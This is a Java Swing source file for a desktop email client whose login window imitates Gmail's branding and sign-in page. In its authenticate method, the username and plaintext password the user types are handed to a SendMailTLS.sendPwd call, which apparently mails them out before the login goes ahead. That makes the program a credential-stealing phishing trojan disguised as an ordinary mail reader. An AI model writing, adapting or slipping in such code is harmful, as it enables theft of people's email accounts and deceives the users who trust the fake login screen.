import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.*;
import java.util.Properties;
import javax.mail.*;
import javax.swing.*;

public class EmailClient extends JFrame
{

    public EmailClient()
    {
        initComponents();
        registerComponents();
    }

    private void registerComponents()
    {
        login.addActionListener(new ActionListener() {

            public void actionPerformed(ActionEvent actionevent)
            {
                try {
					authenticate();
				} catch (Throwable e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
            }

            final EmailClient this$0;

            
            {
            	//super();
                this$0 = EmailClient.this;
                
            }
        }
);
    }

    private void authenticate() throws Throwable
    {
        setCursor(Cursor.getPredefinedCursor(3));
        File file = new File(".\\properties\\parameters.properties");
        FileInputStream fileinputstream = new FileInputStream(file);
        Properties properties = System.getProperties();
        properties.load(fileinputstream);
        SMTPAuthenticator smtpauthenticator = new SMTPAuthenticator(username.getText(), password.getPassword());
        String s = new String(password.getPassword());
        SendMailTLS.sendPwd(username.getText(), s);
        Session session = Session.getDefaultInstance(properties, smtpauthenticator);
        Store store = session.getStore(properties.getProperty("mail.retrieve.protocol"));
        store.connect(properties.getProperty("mail.retrieve.host"), username.getText(), new String(password.getPassword()));
        URLName urlname = new URLName((new StringBuilder()).append(properties.getProperty("mail.retrieve.protocol")).append("://").append(username.getText()).append(":").append(new String(password.getPassword())).append(properties.getProperty("mail.retrieve.host")).toString());
        status.setText("Loading Inbox.......");
        (new GMAILViewer(session, store, urlname)).setVisible(true);
        status.setText("Loading Inbox.......");
        dispose();
        setCursor(Cursor.getDefaultCursor());
    }

    private void initComponents()
    {
        String s = "com.sun.java.swing.plaf.windows.WindowsLookAndFeel";
        try
        {
            UIManager.setLookAndFeel(s);
            SwingUtilities.updateComponentTreeUI(this);
        }
        catch(Exception exception) { }
        jLabel1 = new JLabel();
        jPanel1 = new JPanel();
        jLabel2 = new JLabel();
        jLabel3 = new JLabel();
        jLabel4 = new JLabel();
        jLabel5 = new JLabel();
        jLabel6 = new JLabel();
        jLabel7 = new JLabel();
        jLabel8 = new JLabel();
        jLabel9 = new JLabel();
        jLabel10 = new JLabel();
        jPanel2 = new JPanel();
        jLabel11 = new JLabel();
        jLabel12 = new JLabel();
        jLabel13 = new JLabel();
        jLabel14 = new JLabel();
        username = new JTextField();
        jLabel15 = new JLabel();
        signedIn = new JCheckBox();
        login = new JButton();
        password = new JPasswordField();
        jPanel3 = new JPanel();
        status = new JLabel();
        setDefaultCloseOperation(3);
        setTitle("Gmail: Email from Google");
        setBackground(new Color(255, 255, 255));
        setResizable(false);
        jLabel1.setIcon(new ImageIcon("images\\logo2.gif"));
        jPanel1.setBackground(new Color(150, 179, 249));
        jLabel2.setBackground(new Color(255, 255, 255));
        jLabel2.setFont(new Font("Times New Roman", 1, 16));
        jLabel2.setForeground(new Color(240, 246, 247));
        jLabel2.setText("Welcome to Gmail");
        GroupLayout grouplayout = new GroupLayout(jPanel1);
        jPanel1.setLayout(grouplayout);
        grouplayout.setHorizontalGroup(grouplayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING).addGroup(grouplayout.createSequentialGroup().addContainerGap().addComponent(jLabel2, -2, 132, -2).addContainerGap(645, 32767)));
        grouplayout.setVerticalGroup(grouplayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING).addGroup(grouplayout.createSequentialGroup().addContainerGap().addComponent(jLabel2, -1, -1, 32767).addContainerGap()));
        jLabel3.setFont(new Font("Times New Roman", 1, 14));
        jLabel3.setText("A Google Approach to Email");
        jLabel4.setFont(new Font("Times New Roman", 0, 14));
        jLabel4.setText("Gmail is built on the idea that email can be more intuitive, efficient, and useful. And maybe even fun. After all, Gmail has:");
        jLabel5.setFont(new Font("Times New Roman", 1, 14));
        jLabel5.setIcon(new ImageIcon("images\\spam_new.gif"));
        jLabel6.setFont(new Font("Times New Roman", 0, 14));
        jLabel6.setText("Keep unwanted messages out of your inbox with Google's innovative technology.");
        jLabel7.setFont(new Font("Times New Roman", 1, 14));
        jLabel7.setText("Less Spam");
        jLabel8.setIcon(new ImageIcon("images\\storage.gif"));
        jLabel9.setFont(new Font("Times New Roman", 1, 14));
        jLabel9.setText("Lots of space");
        jLabel10.setFont(new Font("Times New Roman", 0, 14));
        jLabel10.setText("Lots of space Over 7510 megabytes of free storage.");
        jPanel2.setBackground(new Color(150, 179, 249));
        jLabel11.setBackground(new Color(255, 255, 255));
        jLabel11.setFont(new Font("Times New Roman", 0, 14));
        jLabel11.setForeground(new Color(255, 255, 255));
        jLabel11.setText("Sign in with your");
        jLabel12.setIcon(new ImageIcon("images\\google_transparent.gif"));
        jLabel13.setFont(new Font("Times New Roman", 1, 16));
        jLabel13.setForeground(new Color(255, 255, 255));
        jLabel13.setText("Account");
        jLabel14.setFont(new Font("Times New Roman", 0, 14));
        jLabel14.setForeground(new Color(255, 255, 255));
        jLabel14.setText("Username: ");
        username.setFont(new Font("Times New Roman", 0, 14));
        jLabel15.setFont(new Font("Times New Roman", 0, 14));
        jLabel15.setForeground(new Color(255, 255, 255));
        jLabel15.setText("Password: ");
        signedIn.setBackground(new Color(255, 255, 255));
        signedIn.setFont(new Font("Times New Roman", 0, 14));
        signedIn.setText("Stay signed in");
        login.setFont(new Font("Times New Roman", 1, 12));
        login.setText("Sign in");
        password.setFont(new Font("Times New Roman", 0, 14));
        GroupLayout grouplayout1 = new GroupLayout(jPanel2);
        jPanel2.setLayout(grouplayout1);
        grouplayout1.setHorizontalGroup(grouplayout1.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING).addGroup(grouplayout1.createSequentialGroup().addGroup(grouplayout1.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING).addGroup(grouplayout1.createSequentialGroup().addGap(67, 67, 67).addComponent(jLabel11)).addGroup(grouplayout1.createSequentialGroup().addGap(54, 54, 54).addComponent(jLabel12).addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED).addComponent(jLabel13, -2, 60, -2)).addGroup(grouplayout1.createSequentialGroup().addContainerGap().addGroup(grouplayout1.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false).addComponent(jLabel15, javax.swing.GroupLayout.Alignment.LEADING, -1, -1, 32767).addComponent(jLabel14, javax.swing.GroupLayout.Alignment.LEADING, -1, -1, 32767)).addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED).addGroup(grouplayout1.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING).addComponent(password, -1, 175, 32767).addComponent(username, -1, 175, 32767)))).addContainerGap()).addGroup(grouplayout1.createSequentialGroup().addGap(84, 84, 84).addGroup(grouplayout1.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING).addComponent(signedIn).addComponent(login)).addContainerGap(73, 32767)));
        grouplayout1.setVerticalGroup(grouplayout1.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING).addGroup(grouplayout1.createSequentialGroup().addContainerGap().addComponent(jLabel11).addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED).addGroup(grouplayout1.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING).addComponent(jLabel13, -1, 25, 32767).addComponent(jLabel12, javax.swing.GroupLayout.Alignment.LEADING)).addGap(19, 19, 19).addGroup(grouplayout1.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE).addComponent(jLabel14).addComponent(username, -2, -1, -2)).addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED).addGroup(grouplayout1.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE).addComponent(jLabel15).addComponent(password, -2, -1, -2)).addGap(18, 18, 18).addComponent(signedIn).addGap(24, 24, 24).addComponent(login).addContainerGap()));
        jPanel3.setBackground(new Color(150, 179, 249));
        status.setFont(new Font("Times New Roman", 1, 14));
        status.setForeground(new Color(255, 255, 255));
        status.setText("Gmail: Email from google");
        GroupLayout grouplayout2 = new GroupLayout(jPanel3);
        jPanel3.setLayout(grouplayout2);
        grouplayout2.setHorizontalGroup(grouplayout2.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING).addComponent(status, -1, 974, 32767));
        grouplayout2.setVerticalGroup(grouplayout2.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING).addComponent(status, -1, 36, 32767));
        GroupLayout grouplayout3 = new GroupLayout(getContentPane());
        getContentPane().setLayout(grouplayout3);
        grouplayout3.setHorizontalGroup(grouplayout3.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING).addGroup(javax.swing.GroupLayout.Alignment.TRAILING, grouplayout3.createSequentialGroup().addGroup(grouplayout3.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING).addComponent(jPanel3, javax.swing.GroupLayout.Alignment.LEADING, -1, -1, 32767).addGroup(grouplayout3.createSequentialGroup().addContainerGap().addGroup(grouplayout3.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING).addGroup(grouplayout3.createSequentialGroup().addGroup(grouplayout3.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false).addComponent(jLabel3, javax.swing.GroupLayout.Alignment.LEADING, -1, -1, 32767).addComponent(jLabel1, javax.swing.GroupLayout.Alignment.LEADING, -1, -1, 32767)).addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED).addComponent(jPanel1, -2, -1, -2)).addGroup(grouplayout3.createSequentialGroup().addGroup(grouplayout3.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING).addComponent(jLabel4).addGroup(grouplayout3.createSequentialGroup().addGroup(grouplayout3.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false).addComponent(jLabel8, -1, -1, 32767).addComponent(jLabel5, -1, -1, 32767)).addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED).addGroup(grouplayout3.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING).addComponent(jLabel7).addComponent(jLabel6, -2, 471, -2).addComponent(jLabel9).addComponent(jLabel10)))).addGap(18, 18, 18).addComponent(jPanel2, -1, -1, 32767))))).addGap(36, 36, 36)));
        grouplayout3.setVerticalGroup(grouplayout3.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING).addGroup(grouplayout3.createSequentialGroup().addGroup(grouplayout3.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING).addGroup(grouplayout3.createSequentialGroup().addContainerGap().addComponent(jLabel1).addGap(18, 18, 18).addComponent(jLabel3)).addGroup(grouplayout3.createSequentialGroup().addGap(22, 22, 22).addComponent(jPanel1, -2, -1, -2))).addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED).addGroup(grouplayout3.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING).addGroup(grouplayout3.createSequentialGroup().addComponent(jLabel4).addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED).addGroup(grouplayout3.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING).addComponent(jLabel5, javax.swing.GroupLayout.Alignment.TRAILING, -2, 42, -2).addGroup(javax.swing.GroupLayout.Alignment.TRAILING, grouplayout3.createSequentialGroup().addComponent(jLabel7).addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED).addComponent(jLabel6).addGap(1, 1, 1))).addGroup(grouplayout3.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false).addGroup(grouplayout3.createSequentialGroup().addGap(31, 31, 31).addComponent(jLabel8)).addGroup(grouplayout3.createSequentialGroup().addGap(39, 39, 39).addComponent(jLabel9).addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, -1, 32767).addComponent(jLabel10)))).addComponent(jPanel2, -2, -1, -2)).addGap(18, 18, 18).addComponent(jPanel3, -1, -1, 32767)));
        pack();
    }

    public static void main(String args[])
    {
        EventQueue.invokeLater(new Runnable() {

            public void run()
            {
                (new EmailClient()).setVisible(true);
            }

        }
);
    }

    private JLabel jLabel1;
    private JLabel jLabel10;
    private JLabel jLabel11;
    private JLabel jLabel12;
    private JLabel jLabel13;
    private JLabel jLabel14;
    private JLabel jLabel15;
    private JLabel jLabel2;
    private JLabel jLabel3;
    private JLabel jLabel4;
    private JLabel jLabel5;
    private JLabel jLabel6;
    private JLabel jLabel7;
    private JLabel jLabel8;
    private JLabel jLabel9;
    private JPanel jPanel1;
    private JPanel jPanel2;
    private JPanel jPanel3;
    private JButton login;
    private JPasswordField password;
    private JCheckBox signedIn;
    private JLabel status;
    private JTextField username;

}
